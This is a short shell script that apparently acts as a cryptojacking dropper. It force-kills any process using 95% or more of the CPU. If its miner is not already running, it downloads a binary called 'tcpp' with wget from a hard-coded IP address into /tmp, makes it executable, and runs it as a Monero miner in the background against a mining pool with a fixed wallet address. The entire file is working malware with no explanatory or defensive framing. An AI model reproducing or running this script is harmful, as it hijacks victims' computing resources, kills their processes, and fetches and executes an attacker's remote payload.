#!/bin/sh
/bin/ps axf -o "pid %cpu" | awk '{if($2>=95.0) print $1}' | while read procid
do
kill -9 $procid
done
zero=0
process=`ps aux | grep tcpp | grep -v grep| wc -l`
if [ "$process" -eq "$zero" ]; then
	if [ -f /tmp/tcpp ]
 	then
 	/tmp/tcpp --coin monero -o mine.c3pool.com:13333 -u 46YngqQEZQ6HYhqP7noesGdoecXZRM2jR16t7RKTbhW4TtqdKUQyggs3x7pADEWvpr5ySbesyQQwJfaHbewXurEWNdeWNtj -p linux -k --donate-level=1 -B --cpu-max-threads-hint=70
 	echo started existing
 	else
 		wget -q http://146.196.83.217:29324/xxgic/tcpp -O /tmp/tcpp
 		chmod +x /tmp/tcpp
 		/tmp/tcpp --coin monero -o mine.c3pool.com:13333 -u 46YngqQEZQ6HYhqP7noesGdoecXZRM2jR16t7RKTbhW4TtqdKUQyggs3x7pADEWvpr5ySbesyQQwJfaHbewXurEWNdeWNtj -p linux -k --donate-level=1 -B --cpu-max-threads-hint=70
 	fi
else
echo "process runing"
fi
